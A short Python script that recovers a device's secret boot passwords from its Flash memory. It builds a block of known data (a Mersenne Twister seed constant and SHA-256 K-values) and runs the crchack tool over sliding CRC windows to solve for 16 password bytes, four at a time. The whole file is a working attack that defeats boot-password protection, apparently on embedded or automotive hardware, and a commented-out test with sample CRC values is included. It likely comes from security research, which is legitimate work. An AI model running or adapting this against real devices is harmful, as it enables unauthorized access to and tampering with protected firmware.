import subprocess

CRCHACK_PATH = "../crchack/crchack"

# The following cryptographic primitive constants are known values following the device ID and boot passwords in the SBOOT data stored in Flash.
# We combine these in order to construct known data as we can only calculate exactly 256 bytes of CRC at a time - so we need a full 252 byte window worth of known data to slide over in order to deterministically generate 4 bytes of 32-bit CRC.

# Mersenne Twister seed constant
MT_SEED_CONSTANT = bytes.fromhex("DFB00899")
# SHA256 K-Values
SHA256_K_VALUES = bytes.fromhex(
    "982F8A42 91443771 CFFBC0B5 A5DBB5E9 5BC25639 F111F159 A4823F92 D55E1CAB 98AA07D8 015B8312 BE853124 C37D0C55 745DBE72 FEB1DE80 A706DC9B 74F19BC1 C1699BE4 8647BEEF C69DC10F CCA10C24 6F2CE92D AA84744A DCA9B05C DA88F976 52513E98 6DC631A8 C82703B0 C77F59BF F30BE0C6 4791A7D5 5163CA06 67292914 850AB727 38211B2E FC6D2C4D 130D3853 54730A65 BB0A6A76 2EC9C281 852C7292 A1E8BFA2 4B661AA8 708B4BC2 A3516CC7 19E892D1 240699D6 85350EF4 70A06A10 16C1A419 086C371E 4C774827 B5BCB034 B30C1C39 4AAAD84E 4FCA9C5B F36F2E68 EE828F74 6F63A578 1478C884 0802C78C FAFFBE90 EB6C50A4 F7A3F9BE F27871C6"
)

known_data = bytearray()
known_data.extend(bytes(16))  # Unknown area for passwords
known_data.extend(bytes(232))  # Empty area in Flash
known_data.extend(MT_SEED_CONSTANT)  # Seed constant is stored next in Flash
known_data.extend(SHA256_K_VALUES)  # Followed by K-Values

# Run CRCHack to infer the first 4 bytes of data given a CRC
def infer_first_4_bytes(data, crc):
    '''Infer first 4 bytes of "data" using "crc"'''
    crchack_xor = "00000000"
    crchack_init = "00000000"
    crchack_width = "32"
    crchack_exponent = "0x4c11db7"
    crchack_hack_bytes = ":4"
    crchack_input = "-"
    p = subprocess.run(
        [
            CRCHACK_PATH,
            "-x",
            crchack_xor,
            "-i",
            crchack_init,
            "-w",
            crchack_width,
            "-p",
            crchack_exponent,
            "-b",
            crchack_hack_bytes,
            crchack_input,
            crc,
        ],
        input=data,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return p.stdout


def calculate_passwords(crc):
    """Infer the first 16 bytes of data (boot passwords) using 16 bytes of CRC data:

    Parameters:

    * 0x8001420C-0x8001430C -> crc[0]
    * 0x80014210-0x80014310 -> crc[1]
    * 0x80014214-0x80014314 -> crc[2]
    * 0x80014218-0x80014318 -> crc[3]

    Returns:

    boot passwords : bytearray[16]
    """
    for i in range(3, -1, -1):
        start_byte = i * 4
        new_data = infer_first_4_bytes(
            known_data[start_byte : start_byte + 256], crc[i]
        )
        known_data[start_byte : start_byte + 4] = new_data[:4]
    return known_data[0:16]


# crc_test = ["0D0688D9", "4B721FC9", "716224A9", "F427254F"]
# print(calculate_passwords(crc_test).hex())
